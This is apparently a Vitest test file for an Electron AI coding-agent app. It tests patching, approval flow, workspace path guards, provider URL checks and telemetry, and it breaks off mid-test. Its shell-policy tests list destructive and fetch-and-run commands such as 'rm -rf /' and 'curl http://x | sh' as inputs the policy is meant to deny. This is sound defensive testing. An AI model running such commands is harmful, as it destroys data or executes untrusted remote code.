import { describe, it, expect, vi, beforeEach, afterEach } from "vitest"
import { createTwoFilesPatch, parsePatch } from "diff"
import { resolveDefaultExport } from "../src/main/esm-interop"
import {
  parseUnifiedPatch,
  applyPatchToText,
  parsePatchForView,
  normalizePatchBody,
} from "../src/shared/patch"
import { clampToolOutput, truncateMessages, estimateTokens } from "../src/shared/context"
import { deniedShellReason, isElevatedShellRisk } from "../src/shared/shell-policy"
import {
  isAllowedStoreKey,
  sanitizeSessionTitle,
  STORE_VALUE_MAX,
  SESSION_TITLE_MAX,
} from "../src/shared/store-policy"
import { formatPathMention, messagesToMarkdown } from "../src/shared/export"
import {
  toAnthropicMessages,
  anthropicToMessage,
  openAiToMessage,
  buildAgentBody,
  extractDelta,
  resolveKey,
} from "../src/main/providers"
import { SessionRuntime } from "../src/main/session-runtime"
import {
  needsApproval,
  getTool,
  toolDefsFor,
  assertInWorkspace,
  applyWorkspaceDiff,
} from "../src/main/agent"
import { filterCommands, type CommandItem } from "../src/shared/commands"
import {
  computeFunnel,
  TELEMETRY_MAX_EVENTS,
  isSevenDayRetained,
  checkStartupBudget,
  TTFB_BUDGET_MS,
  FIRST_RUN_BUDGET_MS,
  COLD_WINDOW_BUDGET_MS,
  TELEMETRY_EVENT_NAMES,
} from "../src/shared/telemetry"
import type { TelemetryEvent } from "../src/shared/telemetry"
import type { ChatMessage } from "../src/shared/types"
import { calculateFpsStats } from "../src/shared/fps-stats"
import { createRateLimiter } from "../src/shared/rate-limit"
import { shouldUpdateMarkdown } from "../src/shared/markdown-throttle"
import {
  messagesBeforeUserEdit,
  planRegenerate,
  sanitizeMessagesForReplace,
} from "../src/shared/session-edit"
import {
  findAdjacentAssistantIndex,
  findMessageMatchIndices,
  stepMatchIndex,
} from "../src/shared/message-search"
import { isAllowedAppNavigation } from "../src/shared/navigation-policy"
import { isPublicIpAddress, normalizeCustomProviderBase } from "../src/main/provider-url-policy"
import { isMockMode, mockReplyText, buildMockAgentScript } from "../src/main/mock-provider"
import {
  appendEvent,
  formatEventLine,
  parseEventLine,
  readStructuredEvents,
  setStructuredLogDir,
} from "../src/main/structured-log"
import { formatSystemInfo, formatSessionSummary } from "../src/main/diagnostics"
import {
  isMcpToolName,
  mcpToolName,
  parseMcpServers,
  splitMcpToolName,
  validateMcpServerConfig,
} from "../src/shared/mcp"
import { mcpManager } from "../src/main/mcp-client"
import { isValidLogLevel, LOG_LEVELS } from "../src/shared/log-level"
import {
  findSkill,
  isSkillToolName,
  parseSkills,
  skillAppliedContent,
  skillDeniedContent,
  skillNotFoundContent,
  skillToolCallOutcome,
  skillToolDefs,
  skillToolName,
  splitSkillToolName,
  validateSkill,
} from "../src/shared/skills"
import { MAX_SSE_EVENT_CHARS, SseParser } from "../src/shared/sse-parser"
import { mkdtempSync, writeFileSync, rmSync } from "node:fs"
import { join } from "node:path"
import { tmpdir } from "node:os"

describe("export helpers", () => {
  it("formatPathMention quotes paths with spaces", () => {
    expect(formatPathMention("src/a.ts")).toBe("@src/a.ts")
    expect(formatPathMention("my file.ts")).toBe('@"my file.ts"')
  })

  it("messagesToMarkdown skips system and formats roles", () => {
    const md = messagesToMarkdown(
      [
        { role: "system", content: "sys" },
        { role: "user", content: "hello" },
        { role: "assistant", content: "world" },
        { role: "tool", name: "read_file", content: "ok" },
      ],
      { title: "T", sessionId: "s1" },
    )
    expect(md).toContain("# T")
    expect(md).toContain("## User")
    expect(md).toContain("hello")
    expect(md).toContain("## Assistant")
    expect(md).toContain("tool · read_file")
    expect(md).not.toContain("sys")
  })
})

describe("session autoTitle helpers", () => {
  it("collapses whitespace for first-user title slice", () => {
    // Mirrors session.ts autoTitleSession body without electron-store.
    const content = "  hello\n\n  world  and more text that is long enough  "
    const oneLine = content.replace(/\s+/g, " ").trim()
    const title = oneLine.slice(0, 40) || "新会话"
    expect(title).toBe("hello world and more text that is long e")
    expect(title.length).toBeLessThanOrEqual(40)
  })
})

describe("esm-interop resolveDefaultExport", () => {
  it("returns a bare function as-is (already unwrapped / CJS class)", () => {
    class Store {}
    expect(resolveDefaultExport(Store)).toBe(Store)
  })

  it("unwraps pure-ESM require shape { default, __esModule }", () => {
    class ElectronStore {}
    const mod = { __esModule: true, default: ElectronStore }
    expect(resolveDefaultExport(mod)).toBe(ElectronStore)
    // mirrors the packaged-app crash: bare new on the namespace fails,
    // unwrapped constructor succeeds
    expect(() => new (mod as unknown as new () => unknown)()).toThrow()
    const Ctor = resolveDefaultExport(mod) as new () => ElectronStore
    expect(new Ctor()).toBeInstanceOf(ElectronStore)
  })

  it("throws on unusable modules", () => {
    expect(() => resolveDefaultExport(null)).toThrow(/default export/)
    expect(() => resolveDefaultExport(42)).toThrow(/default export/)
    expect(() => resolveDefaultExport({})).toThrow(/default export/)
  })
})

describe("patch (diff package + shared)", () => {
  it("applies single-hunk patch", () => {
    const original = "a\nb\nc\n"
    const target = "a\nB\nc\n"
    const patch = createTwoFilesPatch("f.txt", "f.txt", original, target)
    const files = parseUnifiedPatch(patch)
    expect(files).toHaveLength(1)
    expect(applyPatchToText(original, files[0].structured)).toBe(target)
  })

  it("applies multi-hunk patch without corrupting later hunks", () => {
    const original =
      [
        "A1",
        "A2",
        "A3",
        ...Array.from({ length: 40 }, (_, i) => `pad-${i}`),
        "B1",
        "B2",
        "B3",
      ].join("\n") + "\n"
    const target =
      [
        "A1",
        "A2-MOD",
        "A3",
        ...Array.from({ length: 40 }, (_, i) => `pad-${i}`),
        "B1",
        "B2-MOD",
        "B3",
      ].join("\n") + "\n"
    const patch = createTwoFilesPatch("m.txt", "m.txt", original, target)
    const parsed = parsePatch(patch)
    expect(parsed[0].hunks.length).toBeGreaterThanOrEqual(2)
    const files = parseUnifiedPatch(patch)
    const applied = applyPatchToText(original, files[0].structured)
    expect(applied).toBe(target)
  })

  it("parsePatchForView extracts files and rows", () => {
    const body = `--- a/x.ts
+++ b/x.ts
@@ -1,2 +1,2 @@
 keep
-old
+new
`
    const { files } = parsePatchForView(body)
    expect(files[0].path).toBe("x.ts")
    expect(files[0].rows.some((r) => r.type === "add")).toBe(true)
    expect(files[0].rows.some((r) => r.type === "del")).toBe(true)
  })

  it("normalizePatchBody strips @@ patch prefix", () => {
    const raw = "@@ patch\n--- a/f\n+++ b/f\n@@ -1 +1 @@\n-a\n+b\n"
    expect(normalizePatchBody(raw)).toContain("---")
    expect(normalizePatchBody(raw)).not.toMatch(/^@@ patch/)
  })
})

describe("workspace patch transaction", () => {
  it("precomputes all files before writing any change", async () => {
    const workspace = mkdtempSync(join(tmpdir(), "dave-patch-"))
    try {
      writeFileSync(join(workspace, "first.txt"), "old-first\n")
      writeFileSync(join(workspace, "second.txt"), "actual-second\n")
      const first = createTwoFilesPatch("first.txt", "first.txt", "old-first\n", "new-first\n")
      const invalidSecond = createTwoFilesPatch(
        "second.txt",
        "second.txt",
        "expected-second\n",
        "new-second\n",
      )

      await expect(applyWorkspaceDiff(workspace, `${first}\n${invalidSecond}`)).rejects.toThrow()
      expect(
        await import("node:fs/promises").then((fs) =>
          fs.readFile(join(workspace, "first.txt"), "utf8"),
        ),
      ).toBe("old-first\n")
    } finally {
      rmSync(workspace, { recursive: true, force: true })
    }
  })

  it("applies a valid multi-file patch", async () => {
    const workspace = mkdtempSync(join(tmpdir(), "dave-patch-"))
    try {
      writeFileSync(join(workspace, "a.txt"), "a-old\n")
      writeFileSync(join(workspace, "b.txt"), "b-old\n")
      const patchA = createTwoFilesPatch("a.txt", "a.txt", "a-old\n", "a-new\n")
      const patchB = createTwoFilesPatch("b.txt", "b.txt", "b-old\n", "b-new\n")
      const result = await applyWorkspaceDiff(workspace, `${patchA}\n${patchB}`)
      expect(result.ok).toBe(true)
      const fs = await import("node:fs/promises")
      expect(await fs.readFile(join(workspace, "a.txt"), "utf8")).toBe("a-new\n")
      expect(await fs.readFile(join(workspace, "b.txt"), "utf8")).toBe("b-new\n")
    } finally {
      rmSync(workspace, { recursive: true, force: true })
    }
  })
})

describe("context truncation", () => {
  it("clampToolOutput shortens huge strings", () => {
    const big = "x".repeat(100_000)
    const out = clampToolOutput(big, 1000)
    expect(out.length).toBeLessThan(1200)
    expect(out).toContain("截断")
  })

  // js-tiktoken getEncoding("cl100k_base") cold-load takes ~6.5s on first call,
  // exceeding the default 5000ms Vitest timeout. This test is the first to
  // trigger the lazy init, so we give it a generous timeout.
  it("truncateMessages keeps newest under budget", { timeout: 15_000 }, () => {
    const msgs: ChatMessage[] = [
      { role: "system", content: "sys" },
      { role: "user", content: "old ".repeat(2000) },
      { role: "assistant", content: "mid ".repeat(2000) },
      { role: "user", content: "latest question" },
    ]
    const kept = truncateMessages(msgs, 500)
    expect(kept.some((m) => m.role === "system")).toBe(true)
    expect(kept[kept.length - 1].content).toBe("latest question")
  })

  it("estimateTokens returns positive for text", () => {
    expect(estimateTokens("hello world")).toBeGreaterThan(0)
  })
})

describe("deleteSession cleans sessionRuntime", () => {
  // 验证 src/main/session.ts 的 deleteSession 一定调用 sessionRuntime.abortSession,
  // 否则 AbortController / pending approval 会无限驻留 sessionRuntime.Map,
  // 长生命周期下产生内存泄漏(项目硬约束)。
  it("invokes sessionRuntime.abortSession on delete", async () => {
    vi.resetModules()
    // 在 mock 前取出真实 SessionRuntime,把它的 abortSession 替换为 spy。
    const realRuntimeMod = await import("../src/main/session-runtime")
    const spy = vi.fn((id: string) => realRuntimeMod.sessionRuntime.abortSession(id))
    // mock sessionRuntime 模块,让 session.ts 拿到带 spy 的实例。
    vi.doMock("../src/main/session-runtime", () => {
      class TrackedRuntime extends realRuntimeMod.SessionRuntime {
        override abortSession(id: string): void {
          spy(id)
          return super.abortSession(id)
        }
      }
      return { SessionRuntime: TrackedRuntime, sessionRuntime: new TrackedRuntime() }
    })
    // mock electron-store,提供最小可用接口。
    const fakeStore: Record<string, string> = {
      "session-list": JSON.stringify([{ id: "s-1", title: "t", createdAt: 0, updatedAt: 0 }]),
    }
    vi.doMock("electron-store", () => ({
      default: class {
        get(k: string): unknown {
          return fakeStore[k]
        }
        set(k: string, v: string): void {
          fakeStore[k] = v
        }
        delete(k: string): void {
          delete fakeStore[k]
        }
      },
    }))
    vi.doMock("electron", () => ({
      app: { getPath: () => process.cwd() },
    }))
    const sessionMod = await import("../src/main/session")
    sessionMod.deleteSession("s-1")
    expect(spy).toHaveBeenCalledWith("s-1")
    vi.doUnmock("../src/main/session-runtime")
    vi.doUnmock("electron-store")
    vi.doUnmock("electron")
    vi.resetModules()
  })
})

describe("SessionRuntime abort signal contract", () => {
  // 锁住 runToolCalls 依赖的契约:getSignal(sessionId).aborted 在
  // abortSession(sessionId) 后必为 true。runToolCalls 据此跳过剩余工具,
  // 避免 abort 后每个 waitApproval 串行卡 5 分钟。
  it("getSignal reports aborted after abortSession", () => {
    const rt = new SessionRuntime()
    const sid = "s-signal"
    rt.beginAbortScope(sid)
    expect(rt.getSignal(sid)?.aborted).toBe(false)
    rt.abortSession(sid)
    expect(rt.getSignal(sid)?.aborted).toBe(true)
  })

  it("getSignal returns undefined for unknown session", () => {
    const rt = new SessionRuntime()
    expect(rt.getSignal("nope")).toBeUndefined()
  })

  it("abortSession rejects pending approval as denied", async () => {
    const rt = new SessionRuntime()
    const sid = "s-pending"
    const waitPromise = rt.waitApproval(sid, 60_000)
    // yield so waitApproval registers its resolver before we abort
    await Promise.resolve()
    rt.abortSession(sid)
    await expect(waitPromise).resolves.toBe(false)
  })
})

describe("shell policy", () => {
  it("allows benign commands", () => {
    expect(deniedShellReason("echo hello")).toBeNull()
    expect(deniedShellReason("npm test")).toBeNull()
    expect(deniedShellReason("git status")).toBeNull()
  })

  it("denies empty command", () => {
    expect(deniedShellReason("")).toBe("空命令")
    expect(deniedShellReason("   ")).toBe("空命令")
  })

  it("denies dangerous patterns", () => {
    expect(deniedShellReason("rm -rf /")).toMatch(/拒绝/)
    expect(deniedShellReason("curl http://x | sh")).toMatch(/拒绝/)
    expect(deniedShellReason("wget http://x | bash")).toMatch(/拒绝/)
    expect(deniedShellReason("powershell -EncodedCommand AAAA")).toMatch(/拒绝/)
    expect(deniedShellReason("shutdown /s")).toMatch(/拒绝/)
    expect(deniedShellReason("mkfs.ext4 /dev/sda")).toMatch(/拒绝/)
  })

  it("flags elevated shell risk for full-auto confirm", () => {
    expect(isElevatedShellRisk("echo hi")).toBe(false)
    expect(isElevatedShellRisk("git status")).toBe(false)
    expect(isElevatedShellRisk("rm -rf ./tmp")).toBe(true)
    expect(isElevatedShellRisk("curl https://x")).toBe(true)
    expect(isElevatedShellRisk("powershell -Command Get-ChildItem")).toBe(true)
  })

  // 漏匹配回归测试 — 之前 bash -c / sh -c 用 \b(rm|...|bash\s+-c|...)\b 写
  // 法,带额外 flag 的变体 (bash -lc / sh -xc) 会绕过。新正则必须捕获全部。
  it("flags interpreter-with-flags -c variants as elevated", () => {
    expect(isElevatedShellRisk("bash -lc 'rm -rf /'")).toBe(true)
    expect(isElevatedShellRisk("bash -c 'echo hi'")).toBe(true)
    expect(isElevatedShellRisk("sh -lc 'whoami'")).toBe(true)
    expect(isElevatedShellRisk("sh -xc 'echo hi'")).toBe(true)
    expect(isElevatedShellRisk("zsh -c 'echo hi'")).toBe(true)
    expect(isElevatedShellRisk("cmd /c dir")).toBe(true)
    expect(isElevatedShellRisk("cmd.exe /c echo hi")).toBe(true)
    expect(isElevatedShellRisk("pwsh -Command Get-Date")).toBe(true)
  })

  it("does NOT flag benign git/ls/npm commands as elevated", () => {
    expect(isElevatedShellRisk("git status")).toBe(false)
    expect(isElevatedShellRisk("ls -la")).toBe(false)
    expect(isElevatedShellRisk("npm test")).toBe(false)
    expect(isElevatedShellRisk("cat file.txt")).toBe(false)
    expect(isElevatedShellRisk("echo hello world")).toBe(false)
  })
})

describe("command palette filter", () => {
  // 空 query 返回全量(保持原始顺序);非空做大小写不敏感 includes,
  // 命中 title 或 hint 任一即可。
  const items: CommandItem[] = [
    { id: "a", title: "新建会话", hint: "Cmd+N" },
    { id: "b", title: "打开设置", hint: "Cmd+," },
    { id: "c", title: "切换主题" },
    { id: "d", title: "Foo Bar", hint: "Baz" },
  ]

  it("returns all items when query is empty or whitespace", () => {
    expect(filterCommands(items, "").map((i) => i.id)).toEqual(["a", "b", "c", "d"])
    expect(filterCommands(items, "   ").map((i) => i.id)).toEqual(["a", "b", "c", "d"])
  })

  it("matches case-insensitive substring in title", () => {
    expect(filterCommands(items, "新建").map((i) => i.id)).toEqual(["a"])
    expect(filterCommands(items, "FOO").map((i) => i.id)).toEqual(["d"])
  })

  it("matches case-insensitive substring in hint", () => {
    expect(filterCommands(items, "cmd+").map((i) => i.id)).toEqual(["a", "b"])
  })

  it("returns empty when no match", () => {
    expect(filterCommands(items, "nope")).toEqual([])
  })
})

describe("session runtime abort + approval", () => {
  it("abortSession resolves pending approval as false", async () => {
    const rt = new SessionRuntime()
    const p = rt.waitApproval("s1")
    expect(rt.hasPendingApproval("s1")).toBe(true)
    rt.abortSession("s1")
    await expect(p).resolves.toBe(false)
    expect(rt.hasPendingApproval("s1")).toBe(false)
  })

  it("resolveApproval returns false when none pending", () => {
    const rt = new SessionRuntime()
    expect(rt.resolveApproval("none", true)).toBe(false)
  })

  it("beginAbortScope replaces previous controller", () => {
    const rt = new SessionRuntime()
    const s1 = rt.beginAbortScope("x")
    expect(s1.aborted).toBe(false)
    const s2 = rt.beginAbortScope("x")
    expect(s1.aborted).toBe(true)
    expect(s2.aborted).toBe(false)
    rt.abortSession("x")
    expect(s2.aborted).toBe(true)
  })

  // 新增 — waitApproval 必须有超时,否则用户关闭窗口后 promise 永久挂起
  it("waitApproval times out as denied when no user input", async () => {
    const rt = new SessionRuntime()
    const start = Date.now()
    const p = rt.waitApproval("s2", 50) // 50ms 超时
    const result = await p
    const elapsed = Date.now() - start
    expect(result).toBe(false)
    expect(elapsed).toBeGreaterThanOrEqual(45)
    expect(elapsed).toBeLessThan(500)
    expect(rt.hasPendingApproval("s2")).toBe(false)
  })

  it("waitApproval resolves correctly before timeout when user responds", async () => {
    const rt = new SessionRuntime()
    const p = rt.waitApproval("s3", 1000)
    setTimeout(() => rt.resolveApproval("s3", true), 10)
    await expect(p).resolves.toBe(true)
    expect(rt.hasPendingApproval("s3")).toBe(false)
  })

  it("waitApproval second call denies first as lost", async () => {
    const rt = new SessionRuntime()
    const first = rt.waitApproval("s4", 5000)
    const second = rt.waitApproval("s4", 5000)
    // 第二次调用必须立刻拒绝第一次 (prev pattern)
    await expect(first).resolves.toBe(false)
    // 第二次挂起,直到 resolve
    setTimeout(() => rt.resolveApproval("s4", true), 10)
    await expect(second).resolves.toBe(true)
  })
})

describe("agent registry + approval matrix", () => {
  it("toolDefsFor includes propose_patch and excludes file_tree", () => {
    const defs = toolDefsFor("openai") as Array<{ function: { name: string } }>
    const names = defs.map((d) => d.function.name)
    expect(names).toContain("propose_patch")
    expect(names).toContain("apply_patch")
    expect(names).toContain("shell")
    expect(names).not.toContain("file_tree")
  })

  it("needsApproval matrix", () => {
    const shell = getTool("shell")!
    const read = getTool("read_file")!
    const write = getTool("write_file")!
    expect(needsApproval(shell, "ask")).toBe(false)
    expect(needsApproval(write, "suggest")).toBe(true)
    expect(needsApproval(read, "suggest")).toBe(false)
    expect(needsApproval(shell, "auto")).toBe(true)
    expect(needsApproval(write, "auto")).toBe(false)
    expect(needsApproval(shell, "full-auto", { command: "echo hi" })).toBe(true)
    expect(needsApproval(shell, "full-auto", { command: "rm -rf ./x" })).toBe(true)
    expect(needsApproval(write, "full-auto")).toBe(false)
  })
})

describe("assertInWorkspace", () => {
  it("allows relative path inside workspace", async () => {
    const dir = mkdtempSync(join(tmpdir(), "dave-ws-"))
    try {
      writeFileSync(join(dir, "a.txt"), "hi")
      const abs = await assertInWorkspace(dir, "a.txt")
      expect(abs.replace(/\\/g, "/")).toContain("a.txt")
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it("rejects path escape", async () => {
    const dir = mkdtempSync(join(tmpdir(), "dave-ws-"))
    try {
      await expect(assertInWorkspace(dir, "../outside")).rejects.toThrow(/越界/)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it("rejects empty workspace", async () => {
    await expect(assertInWorkspace("", "a.txt")).rejects.toThrow(/工作区未配置/)
  })
})

describe("SSE parser", () => {
  it("supports CRLF, comments, multiline data, and chunk boundaries", () => {
    const parser = new SseParser()
    expect(parser.push(': ping\r\ndata: {"a":\r\n')).toEqual([])
    expect(parser.push("data: 1}\r\n\r\n")).toEqual([{ data: '{"a":\n1}' }])
  })

  it("flushes a final event without a blank terminator", () => {
    const parser = new SseParser()
    expect(parser.push("data: [DONE]", true)).toEqual([{ data: "[DONE]" }])
  })

  it("rejects oversized events", () => {
    const parser = new SseParser()
    expect(() => parser.push(`data: ${"x".repeat(MAX_SSE_EVENT_CHARS + 1)}`)).toThrow(/大小限制/)
  })
})

describe("custom provider URL policy", () => {
  it("accepts public HTTPS origins and normalizes trailing slash", () => {
    expect(normalizeCustomProviderBase("https://api.example.com/v1/")).toBe(
      "https://api.example.com/v1",
    )
  })

  it("rejects plaintext, credentials, non-default ports, and local hosts", () => {
    expect(() => normalizeCustomProviderBase("http://api.example.com/v1")).toThrow(/HTTPS/)
    expect(() => normalizeCustomProviderBase("https://user:pass@api.example.com/v1")).toThrow(
      /用户名或密码/,
    )
    expect(() => normalizeCustomProviderBase("https://api.example.com:8443/v1")).toThrow(/端口/)
    expect(() => normalizeCustomProviderBase("https://localhost/v1")).toThrow(/本机/)
  })

  it("rejects private, loopback, link-local, metadata, and IPv6 local addresses", () => {
    for (const host of [
      "127.0.0.1",
      "10.0.0.1",
      "172.16.0.1",
      "192.168.1.1",
      "169.254.169.254",
      "100.64.0.1",
      "::1",
      "fc00::1",
      "fe80::1",
    ]) {
      expect(isPublicIpAddress(host), host).toBe(false)
    }
    expect(isPublicIpAddress("8.8.8.8")).toBe(true)
    expect(isPublicIpAddress("2606:4700:4700::1111")).toBe(true)
  })
})

describe("resolveKey", () => {
  it("prefers custom-api-key for custom provider", () => {
    const store = {
      get: (k: string) => (k === "custom-api-key" ? "from-custom" : undefined),
    } as never
    expect(resolveKey("custom", store, "from-slot")).toBe("from-custom")
    expect(resolveKey("custom", store, "")).toBe("from-custom")
  })

  it("falls back to provider slot for custom when custom-api-key empty", () => {
    const store = { get: () => "" } as never
    expect(resolveKey("custom", store, "slot-key")).toBe("slot-key")
  })

  it("uses fallback for non-custom providers", () => {
    const store = { get: () => "ignore" } as never
    expect(resolveKey("openai", store, "sk-x")).toBe("sk-x")
  })
})

describe("Anthropic / OpenAI message adapters", () => {
  it("toAnthropicMessages maps tool_calls to tool_use blocks", () => {
    const convo: ChatMessage[] = [
      { role: "user", content: "hi" },
      {
        role: "assistant",
        content: "thinking",
        tool_calls: [
          {
            id: "call_1",
            type: "function",
            function: { name: "read_file", arguments: '{"path":"a.ts"}' },
          },
        ],
      },
      {
        role: "tool",
        tool_call_id: "call_1",
        name: "read_file",
        content: "file body",
      },
    ]
    const out = toAnthropicMessages(convo) as Array<Record<string, unknown>>
    expect(out[0]).toEqual({ role: "user", content: "hi" })
    const asst = out[1] as { role: string; content: Array<Record<string, unknown>> }
    expect(asst.role).toBe("assistant")
    expect(asst.content.some((b) => b.type === "tool_use")).toBe(true)
    const userTool = out[2] as { role: string; content: Array<Record<string, unknown>> }
    expect(userTool.role).toBe("user")
    expect(userTool.content[0].type).toBe("tool_result")
    expect(userTool.content[0].tool_use_id).toBe("call_1")
  })

  it("anthropicToMessage extracts tool_use", () => {
    const msg = anthropicToMessage({
      content: [
        { type: "text", text: "ok" },
        { type: "tool_use", id: "t1", name: "shell", input: { command: "ls" } },
      ],
    })
    expect(msg.content).toBe("ok")
    expect(msg.tool_calls?.[0].function.name).toBe("shell")
    expect(JSON.parse(msg.tool_calls![0].function.arguments).command).toBe("ls")
  })

  it("openAiToMessage reads choices[0].message", () => {
    const msg = openAiToMessage({
      choices: [
        {
          message: {
            content: "hello",
            tool_calls: [
              {
                id: "x",
                type: "function",
                function: { name: "list_files", arguments: "{}" },
              },
            ],
          },
        },
      ],
    })
    expect(msg.content).toBe("hello")
    expect(msg.tool_calls?.[0].function.name).toBe("list_files")
  })

  it("buildAgentBody OpenAI includes tools and tool_call_id", () => {
    const body = JSON.parse(
      buildAgentBody(
        "openai",
        "gpt-4o",
        [
          { role: "user", content: "hi" },
          {
            role: "assistant",
            content: "",
            tool_calls: [
              { id: "1", type: "function", function: { name: "read_file", arguments: "{}" } },
            ],
          },
          { role: "tool", tool_call_id: "1", name: "read_file", content: "ok" },
        ],
        [
          {
            type: "function",
            function: {
              name: "read_file",
              description: "r",
              parameters: { type: "object", properties: {} },
            },
          },
        ],
      ),
    )
    expect(body.stream).toBe(false)
    expect(body.tools).toHaveLength(1)
    expect(body.messages.some((m: { tool_call_id?: string }) => m.tool_call_id === "1")).toBe(true)
  })
})

describe("telemetry funnel", () => {
  // 锁住"打磨提升转化率"的核心漏斗:launched → onboarded → workspaceReady
  // → firstMessage。每个比例不能因重构掉到 0(否则漏斗失效)。
  it("computes zeros for empty event log", () => {
    const f = computeFunnel([])
    expect(f.launched).toBe(0)
    expect(f.onboarded).toBe(0)
    expect(f.workspaceReady).toBe(0)
    expect(f.firstMessage).toBe(0)
    expect(f.rates.onboardRate).toBe(0)
    expect(f.rates.firstMessageRate).toBe(0)
  })

  it("computes rates from a healthy funnel", () => {
    const now = Date.now()
    const events: TelemetryEvent[] = [
      { name: "app_launch", ts: now, props: { ret: "0" } },
      { name: "app_launch", ts: now, props: { ret: "1" } },
      { name: "onboarding_started", ts: now },
      { name: "onboarding_welcome_seen", ts: now, props: { idx: "0", id: "value" } },
      { name: "onboarding_provider_chosen", ts: now, props: { provider: "openai" } },
      { name: "onboarding_api_key_validated", ts: now, props: { provider: "openai" } },
      { name: "onboarding_workspace_chosen", ts: now, props: { len: "10" } },
      { name: "onboarding_completed", ts: now, props: { provider: "openai" } },
      { name: "first_message_sent", ts: now, props: { mode: "ask" } },
    ]
    const f = computeFunnel(events)
    expect(f.launched).toBe(2)
    expect(f.onboarded).toBe(1)
    expect(f.workspaceReady).toBe(1)
    expect(f.firstMessage).toBe(1)
    // onboarded / launched = 1/2
    expect(f.rates.onboardRate).toBeCloseTo(0.5, 5)
    // firstMessage / workspaceReady = 1
    expect(f.rates.firstMessageRate).toBeCloseTo(1, 5)
  })

  it("counts only ret=1 launches as 7-day retained", () => {
    const now = Date.now()
    const events: TelemetryEvent[] = [
      { name: "app_launch", ts: now - 86_400_000, props: { ret: "0" } },
      { name: "app_launch", ts: now, props: { ret: "1" } },
    ]
    expect(isSevenDayRetained(events, now)).toBe(true)
  })

  it("does NOT count single-launch as retained", () => {
    const now = Date.now()
    const events: TelemetryEvent[] = [{ name: "app_launch", ts: now, props: { ret: "0" } }]
    expect(isSevenDayRetained(events, now)).toBe(false)
  })

  it("ignores invalid 7-day window (>28 days)", () => {
    const now = Date.now()
    const events: TelemetryEvent[] = [
      { name: "app_launch", ts: now - 60 * 86_400_000, props: { ret: "0" } },
      { name: "app_launch", ts: now, props: { ret: "1" } },
    ]
    // 60 天前 + 今天 2 次启动,超出 28 天窗口应判 false
    expect(isSevenDayRetained(events, now)).toBe(false)
  })

  it("exposes ring buffer cap as a single tunable", () => {
    // 防止有人在 store 里悄悄改大/改小,影响 store 文件体积
    expect(TELEMETRY_MAX_EVENTS).toBe(5000)
  })

  it("dedups same name+ts so replays don't inflate counts", () => {
    const now = Date.now()
    const events: TelemetryEvent[] = [
      { name: "app_launch", ts: now, props: { ret: "0" } },
      { name: "app_launch", ts: now, props: { ret: "0" } },
      { name: "app_launch", ts: now, props: { ret: "0" } },
    ]
    const f = computeFunnel(events)
    expect(f.launched).toBe(1)
  })

  it("workspaceRate falls back to onboarded when no workspace event", () => {
    // 工作区步骤是可选的,den = onboarded 时 rate = firstMessage/onboarded
    const now = Date.now()
    const events: TelemetryEvent[] = [
      { name: "app_launch", ts: now, props: { ret: "0" } },
      { name: "onboarding_completed", ts: now },
      { name: "first_message_sent", ts: now, props: { mode: "ask" } },
    ]
    const f = computeFunnel(events)
    expect(f.workspaceReady).toBe(0)
    expect(f.firstMessage).toBe(1)
    // 没有 workspace_chosen 事件时,首问率退化为 firstMessage/onboarded
    expect(f.rates.firstMessageRate).toBeCloseTo(1, 5)
  })

  it("retentionRate counts only returning users with ret=1", () => {
    const now = Date.now()
    const events: TelemetryEvent[] = [
      { name: "app_launch", ts: now, props: { ret: "0" } },
      { name: "app_launch", ts: now, props: { ret: "0" } }, // 同时间戳不算
    ]
    const f = computeFunnel(events)
    expect(f.sevenDayRetained).toBe(0)
  })
})

describe("providers — body / delta extras", () => {
  it("buildAgentBody Anthropic uses input_schema and tool_result", () => {
    const body = JSON.parse(
      buildAgentBody(
        "anthropic",
        "claude-sonnet-4-20250514",
        [
          { role: "user", content: "hi" },
          {
            role: "assistant",
            content: "",
            tool_calls: [
              { id: "1", type: "function", function: { name: "read_file", arguments: "{}" } },
            ],
          },
          { role: "tool", tool_call_id: "1", name: "read_file", content: "ok" },
        ],
        [
          {
            type: "function",
            function: {
              name: "read_file",
              description: "r",
              parameters: { type: "object", properties: {} },
            },
          },
        ],
      ),
    )
    expect(body.tools[0].input_schema).toBeTruthy()
    expect(body.messages.some((m: { role: string }) => m.role === "user")).toBe(true)
  })

  it("extractDelta handles OpenAI and Anthropic shapes", () => {
    expect(extractDelta("openai", { choices: [{ delta: { content: "a" } }] })).toBe("a")
    expect(extractDelta("anthropic", { type: "content_block_delta", delta: { text: "b" } })).toBe(
      "b",
    )
    expect(extractDelta("anthropic", { type: "message_start" })).toBe("")
  })
})

describe("telemetry store integration", () => {
  // 验证主进程 telemetry-store 真的把事件落盘、计算漏斗、清空逻辑。
  // electron-store / electron 都不依赖,全部走 vi.doMock 注入。
  beforeEach(() => {
    vi.resetModules()
  })

  it("tracks events with timestamp, dedups by name+ts, caps to ring buffer", async () => {
    const store: Record<string, unknown> = {}
    vi.doMock("electron-store", () => ({
      default: class {
        get(k: string) {
          return store[k]
        }
        set(k: string, v: unknown) {
          store[k] = v
        }
        delete(k: string) {
          delete store[k]
        }
      },
    }))
    vi.doMock("electron", () => ({ app: { getPath: () => process.cwd() } }))
    const mod = await import("../src/main/telemetry-store")
    // 推入 5001 条事件,验证环形缓冲裁剪到 5000
    for (let i = 0; i < 5001; i++) {
      mod.trackEvent("app_launch", { ret: "0", i: String(i) })
    }
    const events = mod.readEvents()
    expect(events.length).toBe(5000)
    // 第一条应该被裁掉 (i=0),第一条应保留
    expect(events[0].props?.i).toBe("1")
    expect(events[4999].props?.i).toBe("5000")
  })

  it("clearEvents wipes the store and isFirstRun resets", async () => {
    const store: Record<string, unknown> = {}
    vi.doMock("electron-store", () => ({
      default: class {
        get(k: string) {
          return store[k]
        }
        set(k: string, v: unknown) {
          store[k] = v
        }
        delete(k: string) {
          delete store[k]
        }
      },
    }))
    vi.doMock("electron", () => ({ app: { getPath: () => process.cwd() } }))
    const mod = await import("../src/main/telemetry-store")
    mod.trackEvent("onboarding_completed", { provider: "openai" })
    expect(mod.isFirstRun()).toBe(false)
    mod.clearEvents()
    expect(mod.readEvents()).toEqual([])
    expect(mod.isFirstRun()).toBe(true)
    const f = mod.getFunnelSnapshot()
    expect(f.launched).toBe(0)
    expect(f.onboarded).toBe(0)
  })

  it("getFunnelSnapshot uses computeFunnel — sanity check", async () => {
    const store: Record<string, unknown> = {}
    vi.doMock("electron-store", () => ({
      default: class {
        get(k: string) {
          return store[k]
        }
        set(k: string, v: unknown) {
          store[k] = v
        }
        delete(k: string) {
          delete store[k]
        }
      },
    }))
